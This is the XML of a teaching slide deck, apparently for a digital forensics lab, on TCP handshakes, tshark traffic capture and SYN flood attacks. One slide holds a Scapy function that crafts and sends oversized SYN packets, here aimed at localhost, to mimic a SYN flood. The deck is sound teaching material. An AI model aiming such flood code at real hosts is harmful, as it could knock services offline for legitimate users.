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467" r:id="rId3"/>
    <p:sldId id="402" r:id="rId4"/>
    <p:sldId id="403" r:id="rId5"/>
    <p:sldId id="468" r:id="rId6"/>
    <p:sldId id="469" r:id="rId7"/>
    <p:sldId id="470" r:id="rId8"/>
    <p:sldId id="464" r:id="rId9"/>
    <p:sldId id="457" r:id="rId10"/>
    <p:sldId id="459" r:id="rId11"/>
    <p:sldId id="465" r:id="rId12"/>
    <p:sldId id="466" r:id="rId13"/>
    <p:sldId id="4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2DB0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826CF-180D-4816-90CF-4B7B83B3EB46}" v="7" dt="2026-07-22T04:52:27.21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3246" autoAdjust="0"/>
    <p:restoredTop sz="89937" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="64" d="100"/>
          <a:sy n="64" d="100"/>
        </p:scale>
        <p:origin x="816" y="3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MainMaster">
      <pc:chgData name="Aminu Idris" userId="a674908a5e2e2f2a" providerId="LiveId" clId="{406A531A-CF7A-4425-A148-9DDE587F8289}" dt="2026-07-22T04:52:27.208" v="6" actId="1076"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldMasterChg chg="addSp delSp modSp">
        <pc:chgData name="Aminu Idris" userId="a674908a5e2e2f2a" providerId="LiveId" clId="{406A531A-CF7A-4425-A148-9DDE587F8289}" dt="2026-07-22T04:52:27.208" v="6" actId="1076"/>
        <pc:sldMasterMkLst>
          <pc:docMk/>
          <pc:sldMasterMk cId="813574162" sldId="2147483648"/>
        </pc:sldMasterMkLst>
        <pc:picChg chg="add mod">
          <ac:chgData name="Aminu Idris" userId="a674908a5e2e2f2a" providerId="LiveId" clId="{406A531A-CF7A-4425-A148-9DDE587F8289}" dt="2026-07-22T04:52:27.208" v="6" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="813574162" sldId="2147483648"/>
            <ac:picMk id="7" creationId="{B65BCD0A-32C7-0ABD-A10C-5DCF3F040658}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Aminu Idris" userId="a674908a5e2e2f2a" providerId="LiveId" clId="{406A531A-CF7A-4425-A148-9DDE587F8289}" dt="2026-07-22T04:52:15.176" v="4" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="813574162" sldId="2147483648"/>
            <ac:picMk id="1026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4:52:17.536" v="5" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="813574162" sldId="2147483648"/>
            <ac:picMk id="1028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4:52:08.785" v="2" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="813574162" sldId="2147483648"/>
            <ac:picMk id="1030" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Aminu Idris" userId="a674908a5e2e2f2a" providerId="LiveId" clId="{406A531A-CF7A-4425-A148-9DDE587F8289}" dt="2026-07-22T04:52:11.719" v="3" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="813574162" sldId="2147483648"/>
            <ac:picMk id="1032" creationId="{00000000-0000-0000-0000-000000000000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wireshark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ~/traffic/basic.log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908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https://www.freecodecamp.org/news/an-introduction-to-http-understanding-the-open-systems-interconnection-model-9dd06233d30e/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://www.geeksforgeeks.org/tcp-3-way-handshake-process/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://www.geeksforgeeks.org/tcp-connection-termination/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94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apt install python3-scapy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4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scapy.all</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> import *</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>def </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>send_syn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>target_ip_address</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>target_port</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>number_of_packets_to_send</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = 4, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>size_of_packet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = 65000):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = IP(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dst</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>target_ip_address</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = TCP(sport=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RandShort</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dport</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>target_port</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, flags="S")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	raw = Raw(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>b"X</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>" * </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>size_of_packet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	p = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> / raw</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	send(p, count=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>number_of_packets_to_send</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, verbose=0)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	print('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>send_syn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(): Sent ' + str(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>number_of_packets_to_send</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) + ' packets of ' + str(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>size_of_packet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) + 'size to ' + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>target_ip_address</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> + ' on port ' + str(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>target_port</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>))</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>send_syn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>target_ip_address</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = "127.0.0.1", </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>target_port</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>= 80)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7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tshark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> lo -c 4 -w </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mySYNFloodCapture.pcap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5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5BCD0A-32C7-0ABD-A10C-5DCF3F0406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09736" y="6155802"/>
            <a:ext cx="12411471" cy="674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HTTP, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tshark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, SYN Flood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1500" dirty="0"/>
              <a:t>Traffic files: https://github.com/frankwxu/digital-forensics-lab/tree/main/Illegal_Possession_Images/lab_files/SYN_Flood</a:t>
            </a:r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FB0E2-088E-699D-680A-502C596F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Three-way handshaking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88D2A-164E-0FAC-C742-D16C16103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28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96" y="2098966"/>
            <a:ext cx="10379505" cy="37774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695C02-FA5C-44DE-96C9-2C760489914C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1043629" y="5876454"/>
            <a:ext cx="9954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 err="1"/>
              <a:t>wget</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> https://raw.githubusercontent.com/frankwxu/digital-forensics-lab/main/Illegal_Possession_Images/lab_files/traffic/basic.log</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1026" name="Picture 2" descr="Making your handshake work for you in your career (opinion)">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6B553118-7AB9-42AA-947F-A8C128042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534" y="472041"/>
            <a:ext cx="1130300" cy="113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aving a great conversation with your users | by Priyam | Chatbots Life">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7F925583-4BBC-4078-B9AB-2F28A0D304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875" y="531697"/>
            <a:ext cx="2036100" cy="1184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ord Bye in Lettering Style Stock Vector - Illustration of meet, letters:  208095630">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4BEA26E6-FC16-467C-A686-DF4691CAB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7254" y="536780"/>
            <a:ext cx="1853519" cy="1112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A7AA2968-722E-4A29-B117-A8E4DF12C4B6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3822044" y="1012538"/>
            <a:ext cx="533809" cy="11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3E8727A-EDE0-4857-B71A-73B6A3654C73}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7198534" y="981546"/>
            <a:ext cx="673161" cy="1112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BC1AD853-2433-45DE-B8DE-47700AFEAF04}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="5527567" y="1602341"/>
            <a:ext cx="434715" cy="20986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213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93" y="1293299"/>
            <a:ext cx="1148045" cy="1148045"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 4" descr="Lenovo ThinkSystem ST550 4110 - 7X10A03VEA | price in dubai UAE EMEA saudi  arabi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97" t="7673" r="16493" b="18352"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5287835" y="1115801"/>
            <a:ext cx="1093062" cy="1297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/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="2202472" y="2664069"/>
            <a:ext cx="21986" cy="34641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6103270" y="2646457"/>
            <a:ext cx="2" cy="348178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224455" y="2989384"/>
            <a:ext cx="3834853" cy="46599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592372" y="2804718"/>
            <a:ext cx="1423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SYN (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>seq</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> =m)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202474" y="3798276"/>
            <a:ext cx="3900796" cy="600807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180493" y="4911968"/>
            <a:ext cx="3834853" cy="46599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01462" y="3591276"/>
            <a:ext cx="2509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SYN (seq =n) , ACK (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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+1)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2372" y="4725865"/>
            <a:ext cx="1107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ACK (n+1)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0900" y="1986978"/>
            <a:ext cx="1534264" cy="369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CLOSED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0897" y="2707959"/>
            <a:ext cx="153426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LISTEN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0898" y="3428943"/>
            <a:ext cx="153426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SYN-RECEIVED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0898" y="5260672"/>
            <a:ext cx="15342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ESTABLISHED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="34" name="Straight Arrow Connector 33"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="29" idx="2"/>
            <a:endCxn id="31" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="7148031" y="2356307"/>
            <a:ext cx="1" cy="351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2"/>
            <a:endCxn id="32" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7148031" y="3077291"/>
            <a:ext cx="0" cy="3516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2" idx="2"/>
            <a:endCxn id="33" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7148031" y="3798275"/>
            <a:ext cx="0" cy="14623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74172" y="1956123"/>
            <a:ext cx="1534264" cy="369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CLOSED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7216" y="3239854"/>
            <a:ext cx="154122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SYN-SEND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571" y="5270790"/>
            <a:ext cx="154122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ESTABLISHED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="45" name="Straight Arrow Connector 44"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="41" idx="2"/>
            <a:endCxn id="43" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="937826" y="2325452"/>
            <a:ext cx="3478" cy="9144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2"/>
            <a:endCxn id="44" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="937826" y="3609186"/>
            <a:ext cx="11355" cy="166160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180493" y="816359"/>
            <a:ext cx="1215589" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="7E9DBF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57338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02100" y="789019"/>
            <a:ext cx="864532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Port 80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09792" y="170028"/>
            <a:ext cx="395653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Seq</a:t>
            </a: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</a:rPr>
              <a:t>uence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#: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the byte number of the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first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byte of data in the TCP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segement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sent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beginning at random # or 0 (relative </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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seq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ACK</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>nowledge</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> #</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>: the sequence number of the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>next</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> byte the receiver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expects</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> to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receive</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin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</a:rPr>
              <a:t>Seq</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> # + size of packet + 1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The receiver </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ack'ing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> sequence number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</a:rPr>
              <a:t> acknowledges receipt of all data bytes less than (but not including) byte number </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC2DB0"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>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</a:rPr>
              <a:t>+1 for SYN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33346" y="6040315"/>
            <a:ext cx="186070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 are in bytes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4934" y="2614543"/>
            <a:ext cx="1050431" cy="520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choose </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>init</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>seq</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>num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5956" y="4382695"/>
            <a:ext cx="1910983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90000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>received SYNACK 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1400" dirty="0"/>
              <a:t>indicates server is live;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1400" dirty="0"/>
              <a:t>send ACK;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="Text Box 84"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="261263" y="1346883"/>
            <a:ext cx="117070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i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
              </a:rPr>
              <a:t>client state</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="Text Box 84"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6453281" y="1346883"/>
            <a:ext cx="127028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 algn="r">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Server state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22147" y="2570492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603" y="3847836"/>
            <a:ext cx="301686" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="7030A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8274" y="5086124"/>
            <a:ext cx="301686" cy="369332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0A32F-1328-4C92-3460-6F6FE6507225}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2499758" y="339419"/>
            <a:ext cx="5095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9855A-29DC-EDB9-8AED-8A66BA07F903}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643320" y="377137"/>
            <a:ext cx="372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n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523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978AF-1CDC-4835-0FED-766F743A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client never completes </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>handshaking process?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7954F-3972-EB62-0802-2F3137868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76650" cy="435133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server waiting and consuming valuable resources in the process </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>If many clients do the same,  the server becomes overwhelmed and unavailable to legitimate users</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SYN flood attack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A9596D6-B13D-5AB3-AA16-601CDEF7B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409" y="1451405"/>
            <a:ext cx="5367464" cy="42503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7D2AFB1-8CCD-7E70-DE3E-5CEE819B1937}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5800409" y="5983730"/>
            <a:ext cx="57393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Segoe Print" panose="02000600000000000000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>An SYN flood attack is a type of Distributed Denial of Service (DDoS) </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"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96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DA402D-93F9-5D6D-F354-D0D162322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Mimic an SYN flood attack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AADC1-00F3-37AC-3005-A1C1BF1AE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3502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4F6946-A75F-B79B-DF18-1914CA91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3A3C8A0-2F96-45E8-D4D5-1DE31A646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client</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Craft our own </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> packets using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Scapy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Target IP 127.0.0.1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1756393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E56F40-784D-BAD2-1231-4397ACB2A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83" y="1904982"/>
            <a:ext cx="9473051" cy="1020387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B6912DF-EF4F-9F3A-8B60-8D34CF93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Scapy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892711-3253-A56A-DF36-05DF31913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95650"/>
            <a:ext cx="10515600" cy="30305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Scapy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> is a powerful Python library for network packet manipulation and analysis. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>It allows users to send, sniff, dissect, and forge network packets and can be used for a wide range of network-related tasks such as network discovery, security scanning, penetration testing, and more.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Scapy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> supports a large number of network protocols and provides a flexible and user-friendly interface for working with network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55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666F5E-8D02-A952-AB4D-31063AEA4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3300" y="1028262"/>
            <a:ext cx="2994920" cy="20956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3B50B0-A358-3BE7-9507-0AB6767E4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75304"/>
            <a:ext cx="12192000" cy="20544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366553-1699-BCD6-AFB2-AEBF988B691C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1274315" y="1028262"/>
            <a:ext cx="237898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working folder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1EB83-33ED-2BE3-7B5E-1A56E8B5F488}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1274314" y="2726177"/>
            <a:ext cx="237898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Craft attack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C93-9C24-2D41-15E2-B8BCE78DCE88}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2706392" y="6596390"/>
            <a:ext cx="6172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https://systemweakness.com/ping-and-syn-flood-attacks-with-python-and-scapy-6e4515435492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41BC3-6AC5-5B7F-15F3-B9DDE4650146}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="719056" y="3472447"/>
            <a:ext cx="97887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>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
